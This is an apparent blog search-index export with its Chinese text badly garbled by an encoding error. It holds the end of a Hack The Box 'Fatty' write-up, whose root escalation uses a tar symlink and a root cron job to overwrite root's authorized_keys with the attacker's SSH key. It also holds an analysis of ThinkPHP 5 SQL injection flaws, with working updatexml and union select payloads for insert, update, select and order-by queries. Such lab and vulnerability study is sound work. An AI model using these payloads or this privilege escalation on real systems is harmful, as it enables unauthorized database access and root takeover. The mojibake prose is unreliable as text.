2&gt;&amp;1å‡çº§tty.(æ²¡æœ‰python,socatã€‚ä½†æ˜¯å¯ä»¥ç”¨ash) user qtc done. å°ç»“ä¸‹,è¿™ä¸ªéƒ¨åˆ†çœŸå¿ƒå›°éš¾ã€‚å‡å¦‚æˆ‘æ²¡æœ‰çœ‹wpçš„è¯ä¼°è®¡æ—©å°±åœ¨ä¸­é—´æŸä¸ªç¯èŠ‚æ”¾å¼ƒäº†ã€‚ä½†æ˜¯æ•´ä½“æµç¨‹ä¸‹æ¥å…³äºjavaçš„ä¸€äº›æ“ä½œè®©æˆ‘å—ç›ŠåŒªæµ…ã€‚å°¤å…¶æ˜¯jaråŒ…çš„éƒ¨åˆ†ã€‚å½“ç„¶æˆ‘ä¹Ÿå¸Œæœ›èƒ½æ‰¾åˆ°é‡å†™jaråŒ…ä»£ç çš„æœ€ä½³æ–¹æ¡ˆã€‚ privesc to rootæ¥ä¸‹æ¥çš„éƒ¨åˆ†å°±æ¯”è¾ƒç®€å•äº†ã€‚åˆšåˆšæˆ‘ä»¬åœ¨start.shä¸­çœ‹åˆ°æ‰§è¡Œçš„å‘½ä»¤é™¤äº†jarä»¥å¤–è¿˜æœ‰cronçš„å®šæ—¶ä»»åŠ¡ã€‚æŸ¥çœ‹ä¸‹æ–‡ä»¶å‘ç°å­˜åœ¨/etc/crontabs.backã€‚å…¶ä¸­å­˜åœ¨å¤‡ä»½çš„cronjobæ–‡ä»¶ 10 * * * * /bin/tar -cf /opt/fatty/tar/logs.tar /opt/fatty/logs/ å®ƒåœ¨å®šæ—¶åœ°å°†/opt/fatty/logs/ ä¸‹çš„å†…å®¹æ‰“åŒ…åˆ°/opt/fatty/tar/logs.taræ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬çœ‹çœ‹é¶æœºåˆ°åº•å¯¹taræ–‡ä»¶åšäº†ä»€ä¹ˆ å¯ä»¥çœ‹åˆ°ã€‚fattyæœ¬æœºåœ¨æ¯éš”ä¸€åˆ†é’Ÿä½¿ç”¨scpåŒæ­¥æ–‡ä»¶ã€‚é‚£ä¹ˆå‡å¦‚å®ƒæ˜¯rootç”¨æˆ·åœ¨æœ¬æœºè°ƒç”¨scpå¹¶ä¸”æ‰§è¡Œè§£åŒ…æ“ä½œã€‚æˆ‘ä»¬å°±æœ‰åŠæ³•è¿›è¡Œææƒ 123ln -sf /root/.ssh/authorized_keys out/logs.tartar -cf logs.tar -C out/ logs.tar tar -tvf logs.tar é¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæŒ‡å‘rootå…¬é’¥çš„è½¯é“¾æ¥ã€‚å¹¶ä¸”æ‰“åŒ…å®ƒè‡ªå·±ã€‚å¯çœ‹åˆ°æ­¤æ—¶logs.taré‡Œçš„å†…å®¹æ˜¯ä¸€ä¸ªæŒ‡å‘root sshå…¬é’¥çš„è½¯é“¾æ¥ã€‚å‡å¦‚æˆ‘ä»¬è§£å‹å®ƒçš„è¯,å°†å¾—åˆ°å®ƒæœ¬èº«ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠå®ƒç§»åŠ¨åˆ°/opt/fatty/tar/logs.tar.é‚£ä¹ˆæ­¤æ—¶å®šæ—¶ä»»åŠ¡æŒ‡æ‰§è¡Œçš„è¯,å°†æŠŠå®ƒè½¬ç§»åˆ°æœ¬æœºã€‚å¹¶ä¸”è§£åŒ…ï¼Œä»è€Œå¾—åˆ°ä¸€ä¸ªlogs.taræ–‡ä»¶,å¹¶ä¸”å®ƒæ˜¯ä¸€ä¸ªæŒ‡å‘å…¬é’¥çš„è½¯é“¾æ¥ã€‚ æ¥ä¸‹æ¥ã€‚å‡å¦‚æˆ‘ä»¬æŠŠdockerä¸Šçš„logs.taræ¢æˆä¸€ä¸ªåŒ…å«æˆ‘ä»¬sshå…¬é’¥çš„æ–‡ä»¶ã€‚é‚£ä¹ˆå½“cronjobå†æ¬¡æ‰§è¡Œæ—¶,scpä¼šæŠŠæ–°çš„logs.tar è¦†ç›–æ—§çš„ã€‚è€Œæ—§çš„logs.taræ˜¯ä¸€ä¸ªæŒ‡å‘sshå…¬é’¥çš„è½¯é“¾æ¥ è¿™æ ·çš„è¯æ€è·¯å°±éå¸¸æ¸…æ¥šäº†ã€‚åœ¨ä¸Šé¢æ‰§è¡Œå®Œlogs.taråæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ 12345cp logs.tar &#x2F;opt&#x2F;fatty&#x2F;tar&#x2F;logs.tar sleep 60echo -n &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCaTnVHUaEL07CrQQoNh1zhTfnl5m6OGd4HPwmutz2ZkEf5fWSXrtMyrlxvNP5mtinS8vlRgEtF4KAsXkFceq4Ga&#x2F;ahgcYTdcKNFJQiBDz3cC1gu4az4mfdSYGIYav0UAiUel5lWN8SJ8FLUEd1hK85dIMOFLZoKNCO1gm1zOMQFB6A+WVUbchPhLm718YMkAawCHXzxhBEwJuQ1Il7wGWyZaPzuCTR+Dgci4xZDVr7459hfQJpGz7ZmTb9msnlk3Vnd156WnbR95qMkHPlaA0DMKPvs&#x2F;GjBf2dCREGdfZloTDo6yf&#x2F;b3Ev9d4n4EiF53nc38jlxLARckbAZwA15DwS15WbOS31ZV&#x2F;ZOi3YtKSkmA7nMRYoE0QZ5uhRMZySB1FfxtHOkZV+EnXD4WPeZwG23sIpQ3AYjlbuOiybnrK5iuKcf8uclLsvf7ToahPDhZSot2bH8gnS20mcC&#x2F;sb+uLrkdI85Qn8oCe7OoLeF&#x2F;QxESa&#x2F;lIMalSvml6dSvR8ORNk&#x3D; root@byc404&#39; &gt; &#x2F;opt&#x2F;fatty&#x2F;tar&#x2F;logs.tar rooted. summary fatty ä½œä¸ºinsaneéš¾åº¦çš„é¶æœºç¡®å®â€å®è‡³åå½’â€ã€‚javaç›¸å…³çš„çŸ¥è¯†ææ€•èƒ½åœ¨ä¸€å¼€å§‹å°±åŠé€€å¾ˆå¤šäººäº†ã€‚ä¸è¿‡å¹¸å¥½è‡ªå·±ä¹‹å‰å­¦ä¹ äº†java webçš„ä¸€äº›åŸºç¡€çŸ¥è¯†,åœ¨è¿™é‡Œçš„å®é™…åœºæ™¯æ‰èƒ½å‘æŒ¥ä½œç”¨ã€‚ä¸€æ¬¡æ¸—é€èƒ½å­¦åˆ°å¾ˆå¤šçŸ¥è¯†ï¼Œç¡®å®å€¼å¾—ç‚¹èµã€‚","categories":[],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"},{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"}]},{"title":"Thinkphp-vuln","slug":"Thinkphp-vuln","date":"2020-08-05T08:20:07.000Z","updated":"2021-02-18T05:09:49.002Z","comments":true,"path":"2020/08/05/Thinkphp-vuln/","link":"","permalink":"https://www.bycsec.top/2020/08/05/Thinkphp-vuln/","excerpt":"è¿™æ®µæ—¶é—´å› ä¸ºä¸€äº›åŸå› è€æ˜¯æœ‰ç‚¹è‡ªæˆ‘çº ç»“,å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºå¯¹æ‰€è®¡åˆ’å­¦ä¹ çš„å†…å®¹æ— æ³•å®šå¤ºçš„åŸå› ã€‚ä¸Šå‘¨å› ä¸ºhwæ‰€ä»¥é”™è¿‡äº†wmctf,èµ›åå»çœ‹é¢˜å‘ç°åŸºæœ¬éƒ½æ˜¯phpä¹‹ç±»çš„,éƒ½ä¸æ˜¯å¾ˆæƒ³çœ‹ã€‚ç›¸å¯¹æ„Ÿå…´è¶£çš„æ¡†æ¶çš„é“¾å­è‡ªå·±ä¹Ÿæ²¡æ‰¾å…¨ã€‚æ„Ÿè§‰èœçš„ä¸è¡Œ,ç›¸æ¯”å‡ ä¸ªæœˆå‰å®¡ä¸€äº›æ¯”èµ›ä¸­çš„æ¡†æ¶æ‰‹ç”Ÿäº†å¾ˆå¤šã€‚","text":"è¿™æ®µæ—¶é—´å› ä¸ºä¸€äº›åŸå› è€æ˜¯æœ‰ç‚¹è‡ªæˆ‘çº ç»“,å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºå¯¹æ‰€è®¡åˆ’å­¦ä¹ çš„å†…å®¹æ— æ³•å®šå¤ºçš„åŸå› ã€‚ä¸Šå‘¨å› ä¸ºhwæ‰€ä»¥é”™è¿‡äº†wmctf,èµ›åå»çœ‹é¢˜å‘ç°åŸºæœ¬éƒ½æ˜¯phpä¹‹ç±»çš„,éƒ½ä¸æ˜¯å¾ˆæƒ³çœ‹ã€‚ç›¸å¯¹æ„Ÿå…´è¶£çš„æ¡†æ¶çš„é“¾å­è‡ªå·±ä¹Ÿæ²¡æ‰¾å…¨ã€‚æ„Ÿè§‰èœçš„ä¸è¡Œ,ç›¸æ¯”å‡ ä¸ªæœˆå‰å®¡ä¸€äº›æ¯”èµ›ä¸­çš„æ¡†æ¶æ‰‹ç”Ÿäº†å¾ˆå¤šã€‚ æœ€è¿‘å› ä¸ºä¸€ç›´åœ¨çœ‹Node.jsç›¸å…³çš„æ¼æ´è·Ÿå¼€å‘å»äº†,åŠ ä¸Šè‡ªå·±ä¸€ç›´å¯¹phpå¿ƒé‡Œæœ‰ç§åŒæ¶æ„Ÿ,å¯¼è‡´æ²¡æœ‰åŠ²å¤´å»æ·±å…¥å­¦ä¹ ã€‚è€Œä¸Šå‘¨hwçš„ç»å†è®©æˆ‘æ„è¯†åˆ°phpä»æ—§æ˜¯å›½å†…å„ç§ç½‘ç«™çš„å¤§å¤´ã€‚æ‰€ä»¥ç—›ä¸‹å†³å¿ƒ,å¼€å§‹æŠŠphpè·Ÿjavaçš„çŸ¥è¯†åŒæ­¥å­¦ä¹ ã€‚è¿™é‡Œå°±ç”¨çº¢æ—¥ä¸ƒæœˆç«å¸ˆå‚…ä»–ä»¬çš„thinkphpvulné¡¹ç›®å§ã€‚å¸Œæœ›èƒ½å¤Ÿå¯¹ä»£å®¡çš„åŠŸåŠ›æœ‰æ‰€æå‡ã€‚ tp5-sqli-insertå®‰è£…çš„è¯composer ä¸€æŠŠæ¢­ã€‚å…·ä½“å‚è§Thinkphp-vulné¡¹ç›®ã€‚å®‰è£…tpdemo5.0.13&lt;=ThinkPHP&lt;=5.0.15 ã€ 5.1.0&lt;=ThinkPHP&lt;=5.1.5 ç‰ˆæœ¬é—´çš„sqlæ³¨å…¥æ¼æ´ã€‚åˆ©ç”¨çš„è¯éœ€è¦æ›´æ”¹Index.php 123456789101112&lt;?phpnamespace app\\index\\controller;class Index&#123; public function index() &#123; $username = request()-&gt;get('username/a'); db('users')-&gt;insert(['username' =&gt; $username]); return 'Update success'; &#125;&#125; åˆ©ç”¨payload 1http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]&#x3D;1 æ³¨æ„è¿™æ˜¯åœ¨å¼€å¯äº†tpçš„app_debugæƒ…å†µä¸‹çš„ã€‚å¦åˆ™æˆ‘ä»¬çš„æŠ¥é”™æ³¨å…¥åº”è¯¥æ˜¯çœ‹ä¸åˆ°å›æ˜¾ã€‚ é¦–å…ˆæˆ‘ä»¬è·Ÿç€Index.phpä¸­dbè¿™è¡Œè¯­å¥,è·Ÿè¿›think/db/Query.phpçš„insertå‡½æ•°ã€‚æ‰§è¡Œçš„sqlè¯­å¥å¦‚ä¸‹ã€‚æˆ‘ä»¬å¿…ç„¶è¦è·Ÿè¿›è¿™ä¸ªsqlè¯­å¥ç ”ç©¶æ³¨å…¥çš„å¯èƒ½ã€‚ 1$sql = $this-&gt;builder-&gt;insert($data, $options, $replace); é¦–å…ˆ $this-&gt;builder ä¸º\\think\\db\\builder\\Mysql ç±»(è¿™ä¸ªå…¶å®å°±å–å†³äºä½ è¿æ¥çš„æ•°æ®åº“ç±»å‹ã€‚ç¨å¾®å¾€å‰è·Ÿä¸‹å¯ä»¥çœ‹åˆ°) Mysqlç±»ç»§æ‰¿äºBuilderç±»ã€‚æ‰€ä»¥çœ‹å‘Builderçš„insertå‡½æ•°ã€‚ è¿™é‡Œå…ˆè·Ÿè¿›ä¸‹parseData 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152protected function parseData($data, $options)&#123; if (empty($data)) &#123; return []; &#125; // è·å–ç»‘å®šä¿¡æ¯ $bind = $this-&gt;query-&gt;getFieldsBind($options['table']); if ('*' == $options['field']) &#123; $fields = array_keys($bind); &#125; else &#123; $fields = $options['field']; &#125; $result = []; foreach ($data as $key =&gt; $val) &#123; $item = $this-&gt;parseKey($key, $options); if (is_object($val) &amp;&amp; method_exists($val, '__toString')) &#123; // å¯¹è±¡æ•°æ®å†™å…¥ $val = $val-&gt;__toString(); &#125; if (false === strpos($key, '.') &amp;&amp; !in_array($key, $fields, true)) &#123; if ($options['strict']) &#123; throw new Exception('fields not exists:[' . $key . ']'); &#125; &#125; elseif (is_null($val)) &#123; $result[$item] = 'NULL'; &#125; elseif (is_array($val) &amp;&amp; !empty($val)) &#123; switch ($val[0]) &#123; case 'exp': $result[$item] = $val[1]; break; case 'inc': $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]); break; case 'dec': $result[$item] = $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]); break; &#125; &#125; elseif (is_scalar($val)) &#123; // è¿‡æ»¤éæ ‡é‡æ•°æ® if (0 === strpos($val, ':') &amp;&amp; $this-&gt;query-&gt;isBind(substr($val, 1))) &#123; $result[$item] = $val; &#125; else &#123; $key = str_replace('.', '_', $key); $this-&gt;query-&gt;bind('data__' . $key, $val, isset($bind[$key]) ? $bind[$key] : PDO::PARAM_STR); $result[$item] = ':data__' . $key; &#125; &#125; &#125; return $result;&#125; parsedataæ¥å—çš„å‚æ•°æ˜¯æˆ‘ä»¬ä¼ è¿›çš„å‚æ•°useranmeæ•°æ®ã€‚ç®€å•çœ‹ä¸‹ä¼šå‘ç°ä¸­é—´çš„ä¸€ä¸ªforå¾ªç¯æ˜¯åœ¨éå†æˆ‘ä»¬ä¼ è¿›çš„æ•°ç»„å¹¶ä¸”åªæ˜¯è¿›è¡Œä¸€ä¸ªæ‹¼æ¥çš„æ“ä½œã€‚æœ€åè¿”å›æ•°æ®ã€‚æ¯”å¦‚æˆ‘ä»¬çš„payloadå¯¹åº”å¦‚ä¸‹ã€‚$val[0]=inc,ä¹‹åè¿”å›çš„$resultåªæ˜¯$val[1],$val[2]çš„æ‹¼æ¥ã€‚parseKey æ–¹æ³•å¹¶æ²¡æœ‰åœ¨å¤„ç†æˆ‘ä»¬çš„è¾“å…¥æ•°æ®åå½±å“ä»€ä¹ˆã€‚ 123456789case 'inc': $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]); break;``` æ‰€ä»¥è¿™é‡Œå¤„ç†å®Œåå›åˆ°insertå‡½æ•°ã€‚æˆ‘ä»¬çš„è¾“å…¥ç›´æ¥é€åˆ°è¿”å›æ‹¼æ¥çš„sqlè¯­å¥ã€‚é€ æˆsqlæ³¨å…¥å®Œæ•´è¯­å¥ä¸å¦¨ç›´æ¥åœ¨debugæŠ¥é”™çš„åœ°æ–¹çœ‹ã€‚ä¼šå‘ç°å›æ˜¾äº†sqlè¯­å¥```sqlINSERT INTO `users` (`username`) VALUES (updatexml(1,concat(0x7e,version(),0x7e),1)+1) æ˜¾ç„¶ä¸Šé¢caseè¯­å¥é‚£é‡Œç†è®ºä¸Šexp,inc,decéƒ½å¯ä»¥é€ æˆsqlæ³¨å…¥ã€‚ä½†å®é™…æµ‹è¯•ä¼šå‘ç°åªæœ‰username[0]ä¸ºexpæ— æ³•æ³¨å…¥ã€‚è¿™æ˜¯å› ä¸ºthinkphpå†…ç½®è¿‡æ»¤ä¼šå°†expå¤„ç†å˜ä¸ºexp{ç©ºæ ¼}ã€‚å¯¼è‡´æ— æ³•æ³¨å…¥ã€‚ tp5-sqli-updateé…ç½®Index.php 123456789101112&lt;?phpnamespace app\\index\\controller;class Index&#123; public function index() &#123; $username = request()-&gt;get('username/a'); db('users')-&gt;where(['id' =&gt; 1])-&gt;update(['username' =&gt; $username]); return 'Update success'; &#125;&#125; å¤§è‡´æ€è·¯è·Ÿä¸Šé¢ä¸€æ ·ã€‚åªä¸è¿‡æ­¤å¤„æ˜¯updateæ³¨å…¥ã€‚æˆ‘ä»¬åŒæ ·å¯ä»¥è·Ÿåˆ°Query.phpã€‚å‘ç°å…¶å®è°ƒç”¨çš„æ˜¯Connectionç±»çš„updateæ–¹æ³•ã€‚ä»£ç å¦‚ä¸‹ 1$sql = $this-&gt;builder-&gt;update($query); builderä¾æ—§æ˜¯ä¸Šé¢æè¿‡çš„Builderç±»å¯¹è±¡ã€‚å…¶updateæ–¹æ³•ä¾æ—§æ˜¯å…ˆè°ƒç”¨parseDataå†è¿›è¡Œsqlè¯­å¥çš„è¿”å›ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹ä¿®å¤åçš„parseDataçš„caseè¯­å¥ defaultä»£ç æ®µparseArrayData (è¿™é‡Œæˆ‘composerè£…ä¸äº†tp5.1.7,å¦‚æœæ˜¯ä¹‹å‰çš„ç‰ˆæœ¬parseArrayDataåº”è¯¥æ˜¯ç›´æ¥è¿”å›falseçš„) å¯ä»¥çœ‹åˆ°æœ€åå…¶å®resultæ˜¯è¿™æ ·å½¢å¼çš„å­—ç¬¦ä¸²$fun(&#39;$point($value)&#39;)ã€‚é‚£ä¸æˆ‘ä»¬ä¹‹å‰çš„åŸºæœ¬æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«,è¿˜æ˜¯æœ‰æ‹¼æ¥ã€‚ç›´æ¥æ„é€ æˆupdatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)å³å¯.æ‰€ä»¥æˆ‘ä»¬å‰é¢åªè¦è¿›å…¥defaultåˆ†æ”¯å°±èƒ½è¾¾æˆè¿™é‡Œçš„sqlè¯­å¥æ„é€ äº†ã€‚ æœ€åæ”»å‡»payload 1?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0 tp5-sqli-selecté…ç½®Index.php 123456789101112&lt;?phpnamespace app\\index\\controller;class Index&#123; public function index() &#123; $username = request()-&gt;get('username'); $result = db('users')-&gt;where('username','exp',$username)-&gt;select(); return 'select success'; &#125;&#125; payload 1?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7e,user(),0x7e),1)%23 ä»æˆåŠŸæ‰§è¡Œæ³¨å…¥çš„debugç•Œé¢å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ‰§è¡Œçš„sqlè¯­å¥ 1SELECT * FROM `users` WHERE ( `username` ) union select updatexml(1,concat(0x7e,user(),0x7e),1)# ) è¿™æ˜¯ä¸€ä¸ªtp5å…¨ç‰ˆæœ¬çš„æ³¨å…¥ã€‚ä¸è¿‡ä¼¼ä¹å®˜æ–¹ä¸è®¤è¿™ä¸ªæ´ã€‚æ¥ä¸‹æ¥ç›´æ¥è·Ÿä¸‹æºç .é¦–å…ˆæˆ‘ä»¬ä¸Šé¢çš„$username = request()-&gt;get(&#39;username&#39;);ä¼šç»è¿‡Requestç±»è°ƒç”¨inputæ–¹æ³•å¤„ç†è¾“å…¥.ä½†æ˜¯è¿™ä¸ªinputæ–¹æ³•å¹¶æ²¡æœ‰èµ·åˆ°è¿‡æ»¤çš„ä½œç”¨ã€‚åƒæˆ‘ä»¬payloadä¸­ä¸å«/å’Œ.çš„è¯å°±æ˜¯ç›´æ¥åŸæ•°æ®è¿”å›ã€‚ ç„¶åæˆ‘ä»¬çœ‹åˆ°æ¥ä¸‹æ¥è°ƒç”¨çš„Queryç±»çš„whereæ–¹æ³• 1234567public function where($field, $op = null, $condition = null)&#123; $param = func_get_args(); array_shift($param); $this-&gt;parseWhereExp('AND', $field, $op, $condition, $param); return $this;&#125; parseWhereExpè¿™é‡Œä¸ç”¨æ·±å…¥,ä¸»è¦æ˜¯åˆ†ææŸ¥è¯¢æ¨¡å¼ã€‚ç›´æ¥çœ‹è¿”å›å€¼çš„è¯ä¼šå‘ç°è®¾ç½®äº†ç±»ä¸­çš„$options[&#39;where&#39;]ã€‚æˆ‘ä»¬ä¸»è¦çœ‹åé¢select() æ¥ä¸‹æ¥ä¾æ—§æ˜¯tp5æ‰§è¡Œsqlè¯­å¥çš„è€å¥—è·¯ã€‚å®é™…è°ƒç”¨çš„æ˜¯Builderç±»çš„select æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•è°ƒç”¨äº†å·¨é‡çš„str_replace()ç”¨äºå¡«å……è¯­å¥ã€‚whereè¯­å¥æ˜¯å­˜åœ¨ç”¨æˆ·å¯æ§å˜é‡çš„ã€‚æ‰€ä»¥è·Ÿè¿›parseWhere.ç„¶åå‘ç°è°ƒç”¨buildWhere buildwhereä»£ç é‡ç›¸å¯¹æ›´å¤šã€‚ä½†æ˜¯åŒæ ·å­˜åœ¨ä¸€ä¸ªforå¾ªç¯foreach ($where as $key =&gt; $val).è¿™é‡Œæˆ‘ä»¬è¿›å…¥æœ€åä¸€ä¸ªelseã€‚å¹¶ä¸”è°ƒç”¨parseWhereItemã€‚è€ŒparseWhereItemä¸­æœ‰è¿™æ ·çš„elseif 123elseif ('EXP' == $exp) &#123;// è¡¨è¾¾å¼æŸ¥è¯¢ $whereStr .= '( ' . $key . ' ' . $value . ' )'; æ­¤å¤„keyä¸ºusernameã€‚valueä¸ºå¯æ§å˜é‡ã€‚å³å¯æ‹¼æ¥è¾¾æˆæ³¨å…¥ã€‚ tp5.0-sqli-select-5.0.105.0.10ç‰ˆæœ¬çš„sqlæ³¨å…¥ã€‚é…ç½®Index.phpå¦‚ä¸‹ 123456789101112&lt;?phpnamespace app\\index\\controller;class Index&#123; public function index() &#123; $username = request()-&gt;get('username/a'); $result = db('users')-&gt;where(['username' =&gt; $username])-&gt;select(); var_dump($result); &#125;&#125; å¤ç°payload 1?username[0]&#x3D;not like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;) union select 1,user()# å‰é¢æåˆ°äº†æˆ‘ä»¬çš„è¾“å…¥ä¼šç»è¿‡Requestçš„get()æ–¹æ³•ã€‚å®ƒä¼šä¸€è·¯è°ƒç”¨input()ï¼ŒgetFilter(),filterValue(),filterExp()æ¥å¤„ç†æˆ‘ä»¬çš„è¾“å…¥ã€‚ 12345678public function filterExp(&amp;$value)&#123; // è¿‡æ»¤æŸ¥è¯¢ç‰¹æ®Šå­—ç¬¦ if (is_string($value) &amp;&amp; preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i', $value)) &#123; $value .= ' '; &#125; // TODO å…¶ä»–å®‰å…¨è¿‡æ»¤&#125; å¯ä»¥çœ‹åˆ°åƒä¹‹å‰çš„expä¼šè¢«å˜æˆexpçš„å¤„ç†ã€‚ä½†æ˜¯5.0.10ç‰ˆæœ¬çš„è¿‡æ»¤æ˜¯æœ‰é—®é¢˜çš„ã€‚é—®é¢˜å‡ºåœ¨NOTLIKEä¸Šã€‚å…¶æ›´æ–°ç‰ˆæœ¬çš„å¤„ç†æ˜¯åŠ å…¥äº†NOT LIKE. æ¥ä¸‹æ¥è·Ÿä¸Šé¢é‚£ä¸ªå…¨ç‰ˆæœ¬çš„sqlæ³¨å…¥å¯ä»¥æŒ‰ä¸€æ ·çš„æµç¨‹èµ°åˆ°parseWhereItemé‚£ã€‚æˆ‘ä»¬çš„expnot likeå­˜åœ¨äºthis-&gt;expè¿™ä¸ªæ•°ç»„.æ‰€ä»¥ä¼šè¿›å…¥åº•ä¸‹elseif (&#39;LIKE&#39; == $exp || &#39;NOT LIKE&#39; == $exp)çš„åˆ†æ”¯ 1234567891011elseif ('LIKE' == $exp || 'NOT LIKE' == $exp) &#123;// æ¨¡ç³ŠåŒ¹é…if (is_array($value)) &#123; foreach ($value as $item) &#123; $array[] = $key . ' ' . $exp . ' ' . $this-&gt;parseValue($item, $field); &#125; $logic = isset($val[2]) ? $val[2] : 'AND'; $whereStr .= '(' . implode($array, ' ' . strtoupper($logic) . ' ') . ')';&#125; else &#123; $whereStr .= $key . ' ' . $exp . ' ' . $this-&gt;parseValue($value, $field);&#125; å¯ä»¥çœ‹åˆ°$whereStr .= &#39;(&#39; . implode($array, &#39; &#39; . strtoupper($logic) . &#39; &#39;) . &#39;)&#39;;è¿™æ‹¼æ¥äº†logicå˜é‡ã€‚è€Œloginä¼šåœ¨ä¼ å…¥äº†val[2]çš„æ—¶å€™å–è‡ªval[2]ã€‚è¿™æ˜¯ä¸€ä¸ªç”¨æˆ·å¯æ§å˜é‡ã€‚æ‰€ä»¥å¯ä»¥è¾¾æˆsqlæ³¨å…¥ã€‚å‰©ä¸‹çš„æˆ‘ä»¬ç›´æ¥åœ¨å‰é¢æ„é€ ä¸€ä¸ªåˆç†çš„not likeçš„è¯­å¥å°±èƒ½åœ¨åé¢è¿›è¡Œunion select ä»è€Œæ‹¼å‡ºä¸€ä¸ªå®Œæ•´çš„sqlè¯­å¥ã€‚ ä»Šå¤©å…ˆæ›´è¿™ä¹ˆå¤šå§ã€‚çœ‹äº†phpè¿™ä¹ˆä¹…æœç„¶è¿˜æ˜¯nodejsæ›´é¦™â€¦â€¦ tp5-sqli-orderbyIndex.phpé…ç½®å¦‚ä¸‹ 123456789101112&lt;?phpnamespace app\\index\\controller;class Index&#123; public function index() &#123; $orderby = request()-&gt;get('orderby'); $result = db('users')-&gt;where(['username' =&gt; 'byc_404'])-&gt;order($orderby)-&gt;find(); var_dump($result); &#125;&#125; (æ•°æ®åº“ä¸­usersè¡¨å·²æœ‰byc_404ç”¨æˆ·)è¿™é‡Œä½¿ç”¨tp5.1.22ç‰ˆæœ¬ã€‚æ³¨å…¥payload 1?orderby[id&#96;|updatexml(1,concat(0x7e,user(),0x7e),1)%23]&#x3D;1 ä»æˆåŠŸè§¦å‘æ³¨å…¥çš„ä½ç½®æˆ‘ä»¬å¯ä»¥çœ‹åˆ°sqlè¯­å¥å¦‚ä¸‹ 1SELECT * FROM `users` WHERE `username` = 'byc_404' ORDER BY `id`|updatexml(1,concat(0x7e,user(),0x7e),1)#` LIMIT 1 è·Ÿä¸‹æµç¨‹ã€‚é¦–å…ˆ5.1.22å¯¹è¾“å…¥åšçš„è¿‡æ»¤è·Ÿä»¥å¾€ç‰ˆæœ¬ä¸å¤ªä¸€æ ·äº†ã€‚æˆ‘ä»¬å…ˆçœ‹çœ‹getæ–¹æ³•çš„å¤„ç† 12345678public function get($name = '', $default = null, $filter = '')&#123; if (empty($this-&gt;get)) &#123; $this-&gt;get = $_GET; &#125; return $this-&gt;input($this-&gt;get, $name, $default, $filter);&#125; input() 123456789101112131415161718192021222324252627282930313233343536373839404142public function input($data = [], $name = '', $default = null, $filter = '')&#123; if (false === $name) &#123; // è·å–åŸå§‹æ•°æ® return $data; &#125; $name = (string) $name; if ('' != $name) &#123; // è§£æname if (strpos($name, '/')) &#123; list($name, $type) = explode('/', $name); &#125; $data = $this-&gt;getData($data, $name); if (is_null($data)) &#123; return $default; &#125; if (is_object($data)) &#123; return $data; &#125; &#125; // è§£æè¿‡æ»¤å™¨ $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) &#123; array_walk_recursive($data, [$this, 'filterValue'], $filter); reset($data); &#125; else &#123; $this-&gt;filterValue($data, $name, $filter); &#125; if (isset($type) &amp;&amp; $data !== $default) &#123; // å¼ºåˆ¶ç±»å‹è½¬æ¢ $this-&gt;typeCast($data, $type); &#125; return $data;&#125; å¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬çš„$dataæ˜¯æ•°ç»„çš„è¯ã€‚èµ°çš„æ˜¯array_walk_recursiveã€‚è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯ 12array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata &#x3D; NULL ] ) : boolå°†ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•° callback åº”ç”¨åˆ° array æ•°ç»„ä¸­çš„æ¯ä¸ªå•å…ƒ æ¯”å¦‚æˆ‘å†™è¿™æ ·ä¸€ä¸ªdemo 1234567891011&lt;?php$a=array(\"a\"=&gt;\"testtest1232333\",\"b##\"=&gt;\"tes#tt##est\");function sanitize($str)&#123; $str=str_replace(\"#\",\"\",$str); echo($str.\"\\n\");&#125;$end=array_walk_recursive($a,'sanitize'); è‡ªå®šä¹‰ä¸€ä¸ªå›è°ƒå‡½æ•°å°†å­—ç¬¦ä¸­é—´çš„#æ›¿æ¢ä¸ºç©ºã€‚å…¶è¾“å‡ºä¸º å¯ä»¥çœ‹åˆ°å®é™…ä¸Šåªéå†äº†æ•°ç»„çš„å€¼ã€‚æ²¡æœ‰å¤„ç†æ•°ç»„çš„é”®ã€‚æ‰€ä»¥è¿™é‡Œçš„filtervalueå¯¹æ•°ç»„çš„é”®æ²¡æœ‰ä»»ä½•å½±å“ã€‚ ä¹‹åæ‰§è¡Œè¯­å¥æ“ä½œæ—¶ã€‚æˆ‘ä»¬çš„whereä»ç„¶è·Ÿå‰é¢ä¸€æ ·ã€‚å°†å€¼å­˜å‚¨åœ¨$optionsæ•°ç»„ä¸­ã€‚è€Œæ¥å—æˆ‘ä»¬ç”¨æˆ·è¾“å…¥orderæ–¹æ³•ä¹Ÿæ˜¯ä¸€æ 